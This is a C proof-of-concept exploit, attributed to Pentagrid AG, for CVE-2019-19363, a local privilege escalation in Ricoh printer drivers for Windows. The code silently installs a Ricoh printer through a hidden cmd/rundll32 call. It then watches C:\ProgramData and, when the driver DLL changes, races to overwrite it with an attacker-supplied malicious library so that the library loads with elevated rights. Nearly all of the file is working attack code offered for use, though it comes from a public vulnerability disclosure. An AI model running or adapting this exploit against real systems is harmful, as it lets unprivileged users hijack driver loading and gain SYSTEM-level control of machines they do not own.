/*

This proof of concept code monitors file changes on Ricoh's driver DLL files and overwrites
a DLL file before the library is loaded (CVE-2019-19363).

Written by Pentagrid AG, 2019.

Cf. https://pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/

Credits: Alexander Pudwill

This proof of concept code is based on the ReadDirectoryChangesW API call to
get notified about changes on files and directories and reuses parts from the example from
https://www.experts-exchange.com/questions/22507220/ReadDirectoryChangesW-FWATCH-MSDN-sample-not-working.html

*/
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>

#define MAX_BUFFER  4096

int change_counter = 0;
const WCHAR * const BaseDirName = L"C:\\ProgramData";
const WCHAR * TargetDllFullFilePath, * TargetDLLRelFilePath, * MaliciousLibraryFile, * PrinterName;
DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE |
        FILE_NOTIFY_CHANGE_SIZE |
        FILE_NOTIFY_CHANGE_LAST_ACCESS |
        FILE_NOTIFY_CHANGE_CREATION;

typedef struct _DIRECTORY_INFO {
        HANDLE      hDir;
        TCHAR       lpszDirName[MAX_PATH];
        CHAR        lpBuffer[MAX_BUFFER];
        DWORD       dwBufLength;
        OVERLAPPED  Overlapped;
} DIRECTORY_INFO, *PDIRECTORY_INFO, *LPDIRECTORY_INFO;

DIRECTORY_INFO  DirInfo;

void WINAPI HandleDirectoryChange(DWORD dwCompletionPort) {
        DWORD numBytes, cbOffset;
        LPDIRECTORY_INFO di;
        LPOVERLAPPED lpOverlapped;
        PFILE_NOTIFY_INFORMATION fni;
        WCHAR FileName[MAX_PATH];

        do {

                GetQueuedCompletionStatus((HANDLE)dwCompletionPort, &numBytes, (LPDWORD)&di, &lpOverlapped, INFINITE);

                if (di) {
                        fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;

                        do {
                                cbOffset = fni->NextEntryOffset;

                                // get filename
                                size_t num_elem = fni->FileNameLength / sizeof(WCHAR);
                                if (num_elem >= sizeof(FileName) / sizeof(WCHAR)) num_elem = 0;

                                wcsncpy_s(FileName, sizeof(FileName)/sizeof(WCHAR), fni->FileName, num_elem);
                                FileName[num_elem] = '\0';
                                wprintf(L"+ Event for %s [%d]\n", FileName, change_counter);

                                if (fni->Action == FILE_ACTION_MODIFIED) {

                                        if (!wcscmp(FileName, TargetDLLRelFilePath)) {

                                                if (change_counter > 0)
                                                        change_counter--;
                                                if (change_counter == 0) {
                                                        change_counter--;

                                                        if (CopyFile(MaliciousLibraryFile, TargetDllFullFilePath, FALSE))
                                                                wprintf(L"+ File %s copied to %s.\n", MaliciousLibraryFile, TargetDllFullFilePath);

                                                        else {
                                                                wchar_t buf[256];

                                                                FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                                                        NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                                                                        buf, (sizeof(buf) / sizeof(wchar_t)), NULL);

                                                                wprintf(L"+ Failed to copy file %s to %s: %s\n", MaliciousLibraryFile, TargetDllFullFilePath, buf);
                                                        }

                                                        exit(1);
                                                } // end of trigger part
                                        }
                                } // eo action mod
                                fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);

                        } while (cbOffset);

                        // Reissue the watch command
                        ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
                }
        } while (di);
}

void WINAPI InstallPrinter() {
        WCHAR cmd_buf[1000];
        swprintf(cmd_buf, sizeof(cmd_buf), L"/c rundll32 printui.dll, PrintUIEntry /if /b \"Printer\" /r lpt1: /m \"%s\"", PrinterName);
        wprintf(L"+ Adding printer: %s\n", cmd_buf);

        unsigned long ret = (unsigned long) ShellExecuteW(0, L"open", L"cmd", cmd_buf, NULL, SW_HIDE);
        if(ret <= 32) // That seems to be the way to handle ShellExecuteW's ret value.
                wprintf(L"+ Failed launching command. Return value is %d\n", ret);
}

void WINAPI WatchDirectories(HANDLE hCompPort) {
        DWORD   tid;
        HANDLE  hThread;

        ReadDirectoryChangesW(DirInfo.hDir, DirInfo.lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &DirInfo.dwBufLength, &DirInfo.Overlapped, NULL);

        // Create a thread to sit on the directory changes
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HandleDirectoryChange, hCompPort, 0, &tid);

        // Just loop and wait for the user to quit
        InstallPrinter();
        while (_getch() != 'q');

        // The user has quit - clean up
        PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);

        // Wait for the Directory thread to finish before exiting
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
}


int wmain(int argc, WCHAR *argv[]) {
        HANDLE  hCompPort = NULL;                 // Handle To a Completion Port

        if (argc == 6) {
                PrinterName = argv[1];
                TargetDllFullFilePath = argv[2];
                TargetDLLRelFilePath = argv[3];
                MaliciousLibraryFile = argv[4];
                change_counter = _wtoi(argv[5]);
        }
        else {
                wprintf(L"+ Usage: %s <printer_name> <fullpath_monitor_dll> <rel_path_monitor_dll> <new_dll> <counter>\n", argv[0]);
                return 0;
        }
        wprintf(L"+ Monitoring directory %s\n", BaseDirName);

        // Get a handle to the directory
        DirInfo.hDir = CreateFile(BaseDirName,
                FILE_LIST_DIRECTORY,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL,
                OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
                NULL);

        if (DirInfo.hDir == INVALID_HANDLE_VALUE) {
                wprintf(L"Unable to open directory %s. GLE=%ld. Terminating...\n",
                        BaseDirName, GetLastError());
                return 0;
        }

        lstrcpy(DirInfo.lpszDirName, BaseDirName);

        if (HANDLE hFile = CreateFile(TargetDllFullFilePath,
                GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL)) {
                wprintf(L"+ File %s created\n", TargetDllFullFilePath);
                CloseHandle(hFile);
        }
        else
                wprintf(L"+ File %s could not be created\n", TargetDllFullFilePath);


        if ((hCompPort = CreateIoCompletionPort(DirInfo.hDir, hCompPort, (ULONG_PTR)&DirInfo, 0)) == NULL) {
                wprintf(L"+ CreateIoCompletionPort() failed.\n");
                return 0;
        }

        wprintf(L"+ Press <q> to exit\n");

        // Start watching
        WatchDirectories(hCompPort);

        CloseHandle(DirInfo.hDir);
        CloseHandle(hCompPort);
        return 1;
}